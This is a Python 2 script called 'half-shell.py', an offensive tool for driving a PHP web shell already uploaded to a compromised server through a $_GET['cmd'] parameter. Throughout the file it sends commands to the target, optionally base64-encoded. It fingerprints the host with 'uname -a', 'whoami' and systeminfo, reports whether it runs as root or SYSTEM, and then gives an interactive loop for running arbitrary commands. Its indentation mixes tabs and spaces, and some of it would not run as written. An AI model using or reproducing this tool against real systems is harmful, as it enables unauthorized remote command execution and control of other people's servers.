#!/usr/bin/python

import base64
import re
import requests
import sys

def help():
    print("")
    print("   _           _  __        _          _ _        _.---._      ")
    print("  | |__   __ _| |/ _|   ___| |__   ___| | |   _.-{_O___O_}     ")
    print("  | '_ \ / _` | | |_ __/ __| '_ \ / _ \ | |  }_.'`       `'.   ")
    print("  | | | | (_| | |  _|__\__ \ | | |  __/ | |   ( (`-.___.-`) )  ")
    print("  |_| |_|\__,_|_|_|    |___/_| |_|\___|_|_|    '.`\"-----\"`.' ")
    print("                                                 `'-----'` -jgs")
    print("")
    print("Native looking shell for interacting with uploaded $_GET['cmd'] php scripts.\n")
    print("Usage: ./half-shell.py \"url\" [encoding]")
    print("    url        use '{}' to indicate where to inject command, must be in quotes")
    print("    encoding   the encoding used to pass commands, defaults to no encoding")
    print("               currently only supports base64")
    print("    -h         displays this help screen")
    print("")
    sys.exit()

def check_url(url):
    print("\nChecking url...")
    response = requests.get(url)
    if response.status_code != 200:
        print("Error getting page, please check url and try again...")
        sys.exit()

def shell(argv):
    print("Setting up environment...")
    url = argv[1]
    cmd = "echo thisistest"

    #If an encoding was given
    if len(argv) == 3:
        
	#Just accepts base64 right now, will update with other options later
	cmd = base64.b64encode(cmd)
        response = requests.get(url.format(cmd)).text
        
	#Getting extra data that would surround command responses, will be removed later
	extras = response.split("thisistest\n")
	if len(extras) == 3:
		extras = [extras[0],extras[2]]
	
	cmd = base64.b64encode('dir')
        response = requests.get(url.format(cmd)).text
	
	#If it's a Windows target
	if "Directory" in response:
            cmd = base64.b64encode('systeminfo | findstr Name | findstr /V Connection && whoami && cd')
            response = requests.get(url.format(cmd)).text
            
	    #Removing the extra data at the beginning/end of cmd results
	    for extra in extras:
                response = response.replace(extra,"")
            print("\nTarget Information:")
            print(response)
        
	#If it's a Linux target
	else:
            cmd = base64.b64encode('uname -a && whoami && pwd')
            response = requests.get(url.format(cmd)).text
            
	    #Removing the extra data at the beginning/end of cmd results
	    for extra in extras:
                response = response.replace(extra,"")
            print("\nTarget Information:")
            print(response)
        
	if 'system' in response or 'root' in response:
            print("You are running as a privileged user...")
            prompt = "half-shell#> "
        else:
            prompt = "half-shell$> "
        print("Type '(q)uit' or '(e)xit' to exit...\n")

        while True:    
	cmd = raw_input(prompt)
            if cmd.lower() == "quit" or cmd.lower() == "exit" or cmd.lower()== "q" or cmd.lower() == "e":
                sys.exit()
            cmd = base64.b64encode(cmd)
            response = requests.get(url.format(cmd)).text
            for extra in extras:
                response = response.replace(extra,"")
            print(response)

    #If no encoding is used
    else:
        response = requests.get(url.format(cmd)).text
        
	#Getting extra data that would surround command responses, will be removed later
	extras = response.split("thisistest")
        if len(extras) == 3:
                extras = [extras[0],extras[2]]
        cmd = 'dir && pwd'
        response = requests.get(url.format(cmd)).text
        
	#If it's a Windows target
	if "Directory" in response:
            cmd = 'systeminfo | findstr Name | findstr /V Connection && whoami && cd'
            response = requests.get(url.format(cmd)).text
        
	    #Removing the extra data at the beginning/end of cmd results
	    for extra in extras:
                response = response.replace(extra,"")
            print("\nTarget Information:")
            print(response)
	
	#f it's a Linux target
	else:
            cmd = 'uname -a && whoami && pwd'
            response = requests.get(url.format(cmd)).text
	
	    #Removing the extra data at the beginning/end of cmd results
	    for extra in extras:
                response = response.replace(extra,"")
            print("\nTarget Information:")
            print(response)

        if 'system' in response or 'root' in response:
            print("You are running as a privileged user...")
            prompt = "half-shell#> "
        else:
            prompt = "half-shell$> "
        print("Type '(q)uit' or '(e)xit' to exit...\n")

        while True:
            cmd = raw_input(prompt)
            if cmd.lower() == "quit" or cmd.lower() == "exit" or cmd.lower()== "q" or cmd.lower() == "e":
                sys.exit()
            response = requests.get(url.format(cmd)).text
            for extra in extras:
                response = response.replace(extra,"")
            print(response)

if __name__ == "__main__":
    if len(sys.argv) < 2 or '-h' in sys.argv:
        help()

    if "{}" not in sys.argv[1]:
        print("Use {} in url to indicate where to pass commands...")
        help()

    if len(sys.argv) == 3 and sys.argv[2].lower() != 'base64':
        print("Incorrect encoding...\n")
        help()
        
    check_url(sys.argv[1])
    shell(sys.argv)
